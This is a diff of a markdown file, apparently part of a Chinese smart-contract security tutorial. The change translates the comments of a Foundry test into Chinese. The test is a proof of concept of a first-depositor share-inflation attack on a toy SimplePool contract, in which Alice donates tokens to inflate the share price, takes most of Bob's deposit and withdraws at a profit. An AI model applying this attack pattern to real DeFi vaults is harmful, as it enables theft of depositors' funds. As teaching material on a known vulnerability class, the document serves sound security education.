@@ -98,63 +98,63 @@ contract SimplePool {
 
 ***\*测试方法:\****
 
-仿真测试 --contracts src/test/**first-deposit.sol**-vvvv
+forge test --contracts src/test/**first-deposit.sol**-vvvv
 
 ```jsx
-// Function to test the first deposit process
+// 测试首次存款过程的函数
     function testFirstDeposit() public {
-        // Alice's address is set as the first address in the virtual machine
+        // Alice的地址被设置为虚拟机中的第一个地址
         address alice = vm.addr(1);
         
-        // Bob's address is set as the second address in the virtual machine
+        // Bob的地址被设置为虚拟机中的第二个地址
         address bob = vm.addr(2);
         
-        // Transfers 1 Ether plus 1 wei to Alice's account from the MyTokenContract
+        // 从 MyTokenContract 转账 1 Ether 加 1 wei 到 Alice 的账户
         MyTokenContract.transfer(alice, 1 ether + 1);
         
-        // Transfers 2 Ether to Bob's account from the MyTokenContract
+        // 将 2 以太币从 MyTokenContract 转移到 Bob 的账户
         MyTokenContract.transfer(bob, 2 ether);
 
-        // Initiates a "prank" on Alice's account in the virtual machine
+        // 在虚拟机中对 Alice 的帐户发起“恶作剧”
         vm.startPrank(alice);
         
-        // Alice approves the SimplePoolContract to spend 1 wei of her tokens
+        // Alice 批准 SimplePoolContract 花费 1 wei 的代币
         MyTokenContract.approve(address(SimplePoolContract), 1);
         
-        // Alice deposits 1 wei into the SimplePoolContract, receiving 1 pool token in return
+        // Alice 将 1 wei 存入 SimplePoolContract，收到 1 个矿池代币作为回报
         SimplePoolContract.deposit(1);
 
-        // Alice transfers 1 Ether to the SimplePoolContract, which inflates the price of the pool tokens
+        // Alice 将 1 以太币转移到 SimplePoolContract，这会抬高矿池代币的价格
         MyTokenContract.transfer(address(SimplePoolContract), 1 ether);
 
-        // Stops the prank on Alice's account
+        // 停止对 Alice 帐户的恶作剧
         vm.stopPrank();
         
-        // Initiates a prank on Bob's account
+        // 对 Bob 的帐户发起恶作剧
         vm.startPrank(bob);
         
-        // Bob approves the SimplePoolContract to spend 2 Ether of his tokens
+        // Bob 批准 SimplePoolContract 花费其代币中的 2 个以太币
         MyTokenContract.approve(address(SimplePoolContract), 2 ether);
         
-        // Bob deposits 2 Ether into the SimplePoolContract, but due to the inflated price, he only receives 1 pool token
+        // Bob向SimplePoolContract存入2个以太币，但由于价格上涨，他只收到1个矿池代币
         SimplePoolContract.deposit(2 ether);
         
-        // Stops the prank on Bob's account
+        // 停止对 Bob 帐户的恶作剧
         vm.stopPrank();
         
-        // Initiates a prank on Alice's account
+        // 对 Alice 的帐户发起恶作剧
         vm.startPrank(alice);
 
-        // Gets the balance of the SimplePoolContract in MyTokenContract
+        //获取MyTokenContract中SimplePoolContract的余额
         MyTokenContract.balanceOf(address(SimplePoolContract));
 
-        // Alice withdraws 1 pool token and gets 1.5 Ether, thus making a profit
+        // Alice 提取 1 个矿池代币并获得 1.5 以太币，从而获利
         SimplePoolContract.withdraw(1);
         
-        // Asserts that Alice's balance should now be 1.5 Ether. If it's not, it throws an error
+        // 判断 Alice 的余额现在应该是 1.5 以太币。 如果不是，则会抛出错误
         assertEq(MyTokenContract.balanceOf(alice), 1.5 ether);
         
-        // Logs Alice's balance in the console
+        // 在控制台中记录 Alice 的余额
         console.log("Alice balance", MyTokenContract.balanceOf(alice));
     }
 ```
